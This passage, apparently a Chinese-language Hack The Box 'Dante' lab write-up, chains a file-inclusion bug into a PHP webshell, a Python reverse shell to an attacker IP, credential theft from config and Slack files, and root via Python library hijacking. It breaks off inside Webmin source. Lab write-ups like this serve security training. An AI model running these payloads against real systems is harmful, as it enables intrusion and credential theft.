+<p>flag4：DANTE{LF1_M@K3s_u5_lol} </p>
+<p>文件包含读到源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=../../../../../../../../../var/www/html/wordpress/index.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Front to the WordPress application. This file doesn&#x27;t do anything, but loads</span><br><span class="line"> * wp-blog-header.php which does and tells WordPress to load the theme.</span><br><span class="line"> *</span><br><span class="line"> * @package WordPress</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Tells WordPress to load the WordPress theme and output it.</span><br><span class="line"> *</span><br><span class="line"> * @var bool</span><br><span class="line"> */</span><br><span class="line">define( &#x27;WP_USE_THEMES&#x27;, true );</span><br><span class="line"></span><br><span class="line">/** Loads the WordPress Environment and Template */</span><br><span class="line">require __DIR__ . &#x27;/wp-blog-header.php&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(15, 17, 21);"> 现在是要拿shell，尝试</font><strong><font style="color:rgb(15, 17, 21);">文件包含转rce,</font></strong><font style="color:rgb(15, 17, 21);">常见的方法都试了，不太行</font></p>
+<p><font style="color:rgb(52, 52, 60);"> 利用文件包含转rce的工具</font><strong><font style="color:rgb(52, 52, 60);">filter chain </font></strong></p>
+<p><font style="color:rgb(15, 17, 21);"> 生成一个执行系统命令的 webshell  </font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 php_filter_chain_generator.py --chain &#x27;&lt;?php system($_POST[&quot;0&quot;]); ?&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-027.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains curl -X POST &quot;http://172.16.1.10/nav.php?page=你的filter_chain/resource=php://temp&quot; -d &quot;0=id&quot;</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(15, 17, 21);">但是没回显，将命令执行结果写入文件</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-028.png"></p>
+<p><font style="color:rgb(15, 17, 21);">可以，那就写入shell</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 生成一句话木马 base64：PD9waHAgZXZhbCgkX1BPU1RbInBhc3MiXSk7ID8+</span><br><span class="line">PAYLOAD=$(python3 php_filter_chain_generator.py --chain &#x27;&lt;?php file_put_contents(&quot;/var/www/html/shell.php&quot;, base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbInBhc3MiXSk7ID8+&quot;)); ?&gt;&#x27; | tail -1)</span><br><span class="line"></span><br><span class="line"># 写入</span><br><span class="line">proxychains curl -s -X POST &quot;http://172.16.1.10/nav.php?page=$PAYLOAD&quot; -d &quot;0=echo &#x27;&lt;?php eval(\\$\_POST\[pass\]);?&gt;&#x27; &gt; /var/www/html/shell.php&quot;</span><br><span class="line"></span><br><span class="line"># 验证</span><br><span class="line">proxychains curl -s -X POST &quot;http://172.16.1.10/shell.php&quot; -d &quot;pass=phpinfo();&quot; | head -10</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(15, 17, 21);">但是payload太长了，不行，回显写文件里</font></p>
+<p>当前目录</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-029.png"></p>
+<p>wordpress目录</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-030.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-031.png"></p>
+<p>想看wp-config.php，直接读不行，用文件包含读</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-032.png"></p>
+<p><font style="color:rgb(15, 17, 21);">解码：</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * The base configuration for WordPress</span><br><span class="line"> *</span><br><span class="line"> * The wp-config.php creation script uses this file during the</span><br><span class="line"> * installation. You don&#x27;t have to use the web site, you can</span><br><span class="line"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span><br><span class="line"> *</span><br><span class="line"> * This file contains the following configurations:</span><br><span class="line"> *</span><br><span class="line"> * * MySQL settings</span><br><span class="line"> * * Secret keys</span><br><span class="line"> * * Database table prefix</span><br><span class="line"> * * ABSPATH</span><br><span class="line"> *</span><br><span class="line"> * @link https://wordpress.org/support/article/editing-wp-config-php/</span><br><span class="line"> *</span><br><span class="line"> * @package WordPress</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">// ** MySQL settings - You can get this info from your web host ** //</span><br><span class="line">/** The name of the database for WordPress */</span><br><span class="line">define( &#x27;DB_NAME&#x27; &#x27;wordpress&#x27; );</span><br><span class="line"></span><br><span class="line">/** MySQL database username */</span><br><span class="line">define( &#x27;DB_USER&#x27;, &#x27;margaret&#x27; );</span><br><span class="line"></span><br><span class="line">/** MySQL database password */</span><br><span class="line">define( &#x27;DB_PASSWORD&#x27;, &#x27;Welcome1!2@3#&#x27; );</span><br><span class="line"></span><br><span class="line">/** MySQL hostname */</span><br><span class="line">define( &#x27;DB_HOST&#x27;, &#x27;localhost&#x27; );</span><br><span class="line"></span><br><span class="line">/** Database Charset to use in creating database tables. */</span><br><span class="line">define( &#x27;DB_CHARSET&#x27;, &#x27;utf8&#x27; );</span><br><span class="line"></span><br><span class="line">/** The Database Collate type. Don&#x27;t change this if in doubt. */</span><br><span class="line">define( &#x27;DB_COLLATE&#x27;, &#x27;&#x27; );</span><br><span class="line"></span><br><span class="line">/**#@+</span><br><span class="line"> * Authentication Unique Keys and Salts.</span><br><span class="line"> *</span><br><span class="line"> * Change these to different unique phrases!</span><br><span class="line"> * You can generate these using the &#123;@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span><br><span class="line"> * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.</span><br><span class="line"> *</span><br><span class="line"> * @since 2.6.0</span><br><span class="line"> */</span><br><span class="line">define( &#x27;AUTH_KEY&#x27;,         &#x27;put your unique phrase here&#x27; );</span><br><span class="line">define( &#x27;SECURE_AUTH_KEY&#x27;,  &#x27;put your unique phrase here&#x27; );</span><br><span class="line">define( &#x27;LOGGED_IN_KEY&#x27;,    &#x27;put your unique phrase here&#x27; );</span><br><span class="line">define( &#x27;NONCE_KEY&#x27;,        &#x27;put your unique phrase here&#x27; );</span><br><span class="line">define( &#x27;AUTH_SALT&#x27;,        &#x27;put your unique phrase here&#x27; );</span><br><span class="line">define( &#x27;SECURE_AUTH_SALT&#x27;, &#x27;put your unique phrase here&#x27; );</span><br><span class="line">define( &#x27;LOGGED_IN_SALT&#x27;,   &#x27;put your unique phrase here&#x27; );</span><br><span class="line">define( &#x27;NONCE_SALT&#x27;,       &#x27;put your unique phrase here&#x27; );</span><br><span class="line"></span><br><span class="line">/**#@-*/</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * WordPress Database Table prefix.</span><br><span class="line"> *</span><br><span class="line"> * You can have multiple installations in one database if you give each</span><br><span class="line"> * a unique prefix. Only numbers, letters, and underscores please!</span><br><span class="line"> */</span><br><span class="line">$table_prefix = &#x27;wp_&#x27;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * For developers: WordPress debugging mode.</span><br><span class="line"> *</span><br><span class="line"> * Change this to true to enable the display of notices during development.</span><br><span class="line"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span><br><span class="line"> * in their development environments.</span><br><span class="line"> *</span><br><span class="line"> * For information on other constants that can be used for debugging,</span><br><span class="line"> * visit the documentation.</span><br><span class="line"> *</span><br><span class="line"> * @link https://wordpress.org/support/article/debugging-in-wordpress/</span><br><span class="line"> */</span><br><span class="line">define( &#x27;WP_DEBUG&#x27;, false );</span><br><span class="line"></span><br><span class="line">/* That&#x27;s all, stop editing! Happy publishing. */</span><br><span class="line"></span><br><span class="line">/** Absolute path to the WordPress directory. */</span><br><span class="line">if ( ! defined( &#x27;ABSPATH&#x27; ) ) &#123;</span><br><span class="line">	define( &#x27;ABSPATH&#x27;, __DIR__ . &#x27;/&#x27; );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/** Sets up WordPress vars and included files. */</span><br><span class="line">require_once ABSPATH . &#x27;wp-settings.php&#x27;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(15, 17, 21);">找到高权限用户</font><strong><font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">margaret</font></strong><font style="color:rgb(15, 17, 21);">的密码 Welcome1!2@3#  </font></p>
+<p><font style="color:rgb(15, 17, 21);">接下来：反弹 shell → su margaret → 提权</font></p>
+<p><font style="color:rgb(15, 17, 21);">之前 bash 反弹没反应，换 </font><strong>python 反弹</strong><font style="color:rgb(15, 17, 21);">，靶机肯定有 python：</font></p>
+<p><font style="color:rgb(15, 17, 21);">开监听</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(15, 17, 21);">执行 python 反弹</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PAYLOAD=$(python3 php_filter_chain_generator.py --chain &#x27;&lt;?php system($_POST[0]);?&gt;&#x27; | tail -1)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains curl -s -X POST &quot;http://172.16.1.10/nav.php?page=$PAYLOAD&quot; -d &quot;0=python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.10.16.59\&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#x27; &amp;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(15, 17, 21);">拿到 shell 后切换 margaret</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-033.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 先升级交互 shell</span><br><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">export TERM=xterm</span><br><span class="line"># Ctrl+Z 挂起，然后输入：</span><br><span class="line">stty raw -echo; fg</span><br><span class="line"># 回车两次</span><br><span class="line"></span><br><span class="line"># 切换 margaret</span><br><span class="line">su margaret</span><br><span class="line"># 密码：Welcome1!2@3#</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-034.png"></p>
+<p><font style="color:rgb(15, 17, 21);"> </font><strong><font style="color:rgb(15, 17, 21);">受限 shell，用 vim 直接逃逸</font></strong><font style="color:rgb(15, 17, 21);">  </font></p>
+<p><font style="color:rgb(52, 52, 60);">先进入 vim，然后设置 shell 为 sh</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">第 1 步：在 margaret 的受限 shell 里输入：</span><br><span class="line">vim</span><br><span class="line">回车，进入 vim。</span><br><span class="line">第 2 步：按一下 **Esc** 键（确保不在输入模式）。</span><br><span class="line">第 3 步：输入冒号 :，你会看到底部出现 `:` 提示符，然后输入：</span><br><span class="line">set shell=/bin/sh</span><br><span class="line">回车。</span><br><span class="line">第 4 步*：再按冒号:`，输入 shell</span><br><span class="line">回车。</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-035.png"></p>
+<p>但是这个flag之前已经拿到了</p>
+<p>发现slack</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-036.png"></p>
+<p>之前的待办提示：</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-037.png"></p>
+<p><font style="color:rgb(42, 42, 42);">想利用Slack</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-038.png"></p>
+<p>有frank目录，没有权限，要提全</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-039.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-040.png"></p>
+<p>有提权脚本</p>
+<p>:::info<br> Python 库劫持  ：</p>
+<p><strong>原理</strong>：Python 导入模块时，搜索顺序是：</p>
+<ol>
+<li><strong>当前目录</strong>（脚本所在目录 &#x2F; 执行时的工作目录）</li>
+<li>PYTHONPATH 环境变量指定的目录</li>
+<li>标准库目录</li>
+</ol>
+<p>如果我们在<strong>优先搜索路径</strong>里放一个同名的恶意 <code>urllib.py</code> 或 <code>call.py</code>，脚本就会加载我们的恶意代码，并且以 <strong>root 权限</strong>执行。</p>
+<p>:::</p>
+<p>但是当前用户是 margaret  没权限写</p>
+<p>信息收集，找到frank的下载文件</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-041.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-042.png"></p>
+<p>在<font style="color:rgb(52, 52, 60);"> secure&#x2F;2020-05-18.json中找到密码frank&#x2F;69F15HST1CX，但是有加密，再原始路径找到</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.config/Slack/exported_data/secure/2020-05-18.json</span><br></pre></td></tr></table></figure>
+
+<p><font style="color:rgb(52, 52, 60);">frank 密码 TractorHeadtorchDeskmat</font></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-043.png"></p>
+<p>验证</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-044.png"></p>
+<p>用frank身份写恶意 <code>urllib.py</code></p>
+<p>在 frank 的 shell 里执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;import os; os.system(&quot;chmod u+s /bin/bash&quot;)&#x27; &gt; /home/frank/urllib.py</span><br></pre></td></tr></table></figure>
+
+<p>验证写进去了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -la /home/frank/urllib.py</span><br><span class="line">cat /home/frank/urllib.py</span><br></pre></td></tr></table></figure>
+
+<p>然后等 cron 任务执行后检查：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>如果权限变成 <code>-rwsr-xr-x</code></p>
+<p>提权 root</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br><span class="line">id</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-045.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-046.png"></p>
+<p>flag5：DANTE{L0v3_m3_S0m3_H1J4CK1NG_XD}</p>
+<p>当前是在172.16.1.10 是DANTE-NIX02</p>
+<p>之前fscan</p>
+<h2 id="Linux-172-16-1-17"><a href="#Linux-172-16-1-17" class="headerlink" title="Linux:172.16.1.17"></a><font style="color:rgb(15, 17, 21);">Linux:172.16.1.17</font></h2><table>
+<thead>
+<tr>
+<th><font style="color:rgb(15, 17, 21);">172.16.1.17</font></th>
+<th><font style="color:rgb(15, 17, 21);">DANTE-NIX03</font></th>
+<th><font style="color:rgb(15, 17, 21);">80, 139, 445, 10000</font></th>
+<th><font style="color:rgb(15, 17, 21);">SMB 认证成功</font><font style="color:rgb(15, 17, 21);"> </font><code>&lt;font style=&quot;color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);&quot;&gt;administrator:P@ssword123&lt;/font&gt;</code><br/><font style="color:rgb(15, 17, 21);">，运行 Webmin</font></th>
+</tr>
+</thead>
+</table>
+<p><a target="_blank" rel="noopener" href="http://172.16.1.17:10000/">http://172.16.1.17:10000/</a>  </p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-047.png"></p>
+<p>172.16.1.17:80</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-048.png"></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/img/htb/htb-dante-049.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/perl</span><br><span class="line"># Display all Webmin modules visible to the current user</span><br><span class="line"></span><br><span class="line">BEGIN &#123; push(@INC, &quot;.&quot;); &#125;;</span><br><span class="line">use WebminCore;</span><br><span class="line"></span><br><span class="line">&amp;init_config();</span><br><span class="line">&amp;ReadParse();</span><br><span class="line">$hostname = &amp;get_display_hostname();</span><br><span class="line">$ver = &amp;get_webmin_version();</span><br><span class="line">&amp;get_miniserv_config(\%miniserv);</span><br><span class="line">if ($gconfig&#123;&#x27;real_os_type&#x27;&#125;) &#123;</span><br><span class="line">	if ($gconfig&#123;&#x27;os_version&#x27;&#125; eq &quot;*&quot;) &#123;</span><br><span class="line">		$ostr = $gconfig&#123;&#x27;real_os_type&#x27;&#125;;</span><br><span class="line">		&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		$ostr = &quot;$gconfig&#123;&#x27;real_os_type&#x27;&#125; $gconfig&#123;&#x27;real_os_version&#x27;&#125;&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">else &#123;</span><br><span class="line">	$ostr = &quot;$gconfig&#123;&#x27;os_type&#x27;&#125; $gconfig&#123;&#x27;os_version&#x27;&#125;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">%access = &amp;get_module_acl();</span><br><span class="line"></span><br><span class="line"># Build a list of all modules</span><br><span class="line">@modules = &amp;get_visible_module_infos();</span><br><span class="line"></span><br><span class="line">if (!defined($in&#123;&#x27;cat&#x27;&#125;)) &#123;</span><br><span class="line">	# Maybe redirect to some module after login</span><br><span class="line">	local $goto = &amp;get_goto_module(\@modules);</span><br><span class="line">	if ($goto) &#123;</span><br><span class="line">		&amp;redirect($goto-&gt;&#123;&#x27;dir&#x27;&#125;.&#x27;/&#x27;);</span><br><span class="line">		exit;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">$gconfig&#123;&#x27;sysinfo&#x27;&#125; = 0 if ($gconfig&#123;&#x27;sysinfo&#x27;&#125; == 1);</span><br><span class="line"></span><br><span class="line">if ($gconfig&#123;&#x27;texttitles&#x27;&#125;) &#123;</span><br><span class="line">	@args = ( $text&#123;&#x27;main_title2&#x27;&#125;, undef );</span><br><span class="line">	&#125;</span><br><span class="line">else &#123;</span><br><span class="line">	@args = ( $gconfig&#123;&#x27;nohostname&#x27;&#125; ? $text&#123;&#x27;main_title2&#x27;&#125; :</span><br><span class="line">		    &amp;text(&#x27;main_title&#x27;, $ver, $hostname, $ostr),</span><br><span class="line">		  &quot;images/webmin-blue.png&quot; );</span><br><span class="line">	if ($gconfig&#123;&#x27;showlogin&#x27;&#125;) &#123;</span><br><span class="line">		$args[0] = $remote_user.&quot; : &quot;.$args[0];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&amp;header(@args, undef, undef, 1, 1,</span><br><span class="line">	$tconfig&#123;&#x27;brand&#x27;&#125; ? </span><br><span class="line">	&quot;&lt;a href=$tconfig&#123;&#x27;brand_url&#x27;&#125;&gt;$tconfig&#123;&#x27;brand&#x27;&#125;&lt;/a&gt;&quot; :</span><br><span class="line">	$gconfig&#123;&#x27;brand&#x27;&#125; ? </span><br><span class="line">	&quot;&lt;a href=$gconfig&#123;&#x27;brand_url&#x27;&#125;&gt;$gconfig&#123;&#x27;brand&#x27;&#125;&lt;/a&gt;&quot; :</span><br><span class="line">	&quot;&lt;a href=http://www.webmin.com/&gt;$text&#123;&#x27;main_homepage&#x27;&#125;&lt;/a&gt;&quot;</span><br><span class="line">	);</span><br><span class="line">print &quot;&lt;center&gt;&lt;font size=+1&gt;&quot;,</span><br><span class="line">    &amp;text(&#x27;main_version&#x27;, $ver, $hostname, $ostr),&quot;&lt;/font&gt;&lt;/center&gt;\n&quot;</span><br><span class="line">	if (!$gconfig&#123;&#x27;nohostname&#x27;&#125;);</span><br><span class="line">print &quot;&lt;hr id=&#x27;header_hr&#x27;&gt;&lt;p&gt;\n&quot;;</span><br><span class="line"></span><br><span class="line">print $text&#123;&#x27;main_header&#x27;&#125;;</span><br><span class="line"></span><br><span class="line">if (!@modules) &#123;</span><br><span class="line">	# use has no modules!</span><br><span class="line">	print &quot;&lt;p class=&#x27;main_none&#x27;&gt;&lt;b&gt;$text&#123;&#x27;main_none&#x27;&#125;&lt;/b&gt;&lt;p&gt;\n&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">elsif ($gconfig&#123;&quot;notabs_$&#123;base_remote_user&#125;&quot;&#125; == 2 ||</span><br><span class="line">    $gconfig&#123;&quot;notabs_$&#123;base_remote_user&#125;&quot;&#125; == 0 &amp;&amp; $gconfig&#123;&#x27;notabs&#x27;&#125;) &#123;</span><br><span class="line">	# Generate main menu with all modules on one page</span><br><span class="line">	print &quot;&lt;center&gt;&lt;table id=&#x27;mods&#x27; cellpadding=5 cellspacing=0 width=100%&gt;\n&quot;;</span><br><span class="line">	$pos = 0;</span><br><span class="line">	$cols = $gconfig&#123;&#x27;nocols&#x27;&#125; ? $gconfig&#123;&#x27;nocols&#x27;&#125; : 4;</span><br><span class="line">	$per = 100.0 / $cols;</span><br><span class="line">	foreach $m (@modules) &#123;</span><br><span class="line">		if ($pos % $cols == 0) &#123; print &quot;&lt;tr 